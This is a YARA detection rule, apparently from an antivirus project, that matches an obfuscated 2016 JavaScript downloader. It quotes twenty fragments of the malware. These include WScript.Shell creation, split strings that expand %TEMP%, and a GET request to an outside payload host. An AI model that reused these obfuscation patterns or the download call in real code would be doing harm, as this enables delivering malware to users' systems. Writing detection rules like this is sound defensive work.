rule sig_20160427_0da058cb2333469d131b0220620ff09b {
  meta:
    description = "datamaliciousorder - file 20160427_0da058cb2333469d131b0220620ff09b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "f145d9c96bb71a883812daa3d0a7dbfa0b0a666f3137f036bc9883575282fab5"

  strings:
    $s1  = "function ZxwodPchju() {return LpwryRgfhz[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"cD4fsjL" ascii
    $s2  = "function ZxwodPchju() {return LpwryRgfhz[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"cD4fsjL" ascii
    $s3  = "function SnuknPnfto(AlqytNddhn, BqdjhDjthr){FkuqqLuksk = FkuqqLuksk * 1; return AlqytNddhn - BqdjhDjthr;};" fullword ascii
    $s4  = "var LpwryRgfhz = function YooczJtshg() {return PhofoYyibx[RaqslRmjpr](\"WScript\"+\".Shell\");}(), GfmckVgjyv = 11;" fullword ascii
    $s5  = "UvtkhHkcym[TtncmGufgn](\"G\" + \"ET\", \"http://jurang.tk/n2ysk\", false);" fullword ascii
    $s6  = "var PhofoYyibx = this[\"WScript\"];" fullword ascii
    $s7  = "function JhsswBkcet(){return WmhagNciaa + \"\";};" fullword ascii
    $s8  = "if (UvtkhHkcym[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function JloqqGuhml() {return ((OpsibFbqhk == true) && (OpsibFbqhk == QboowNhphd)) ? 1 : FkuqqLuksk;};" fullword ascii
    $s10 = "return SnuknPnfto(GvydiWbnox, XyvxfOizjd);" fullword ascii
    $s11 = "function XkxleBmulf(){return RaqslRmjpr;};" fullword ascii
    $s12 = "OpsibFbqhk = true; " fullword ascii
    $s13 = "var UjepnCdkva = new this[\"D\"+\"ate\"]();" fullword ascii
    $s14 = "var QboowNhphd = false;" fullword ascii
    $s15 = "var HcklyGqqxv = false;" fullword ascii
    $s16 = "}while (GpzflGmmsj);" fullword ascii
    $s17 = "function WeshdPgauc(JwhubMxlrw) {var YhnaiAaneo = (1, 2, 3, 4, 5, JwhubMxlrw); return YhnaiAaneo;};" fullword ascii
    $s18 = "function AspamDnltg()" fullword ascii
    $s19 = "var OpsibFbqhk = false;" fullword ascii
    $s20 = "HcklyGqqxv = true;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}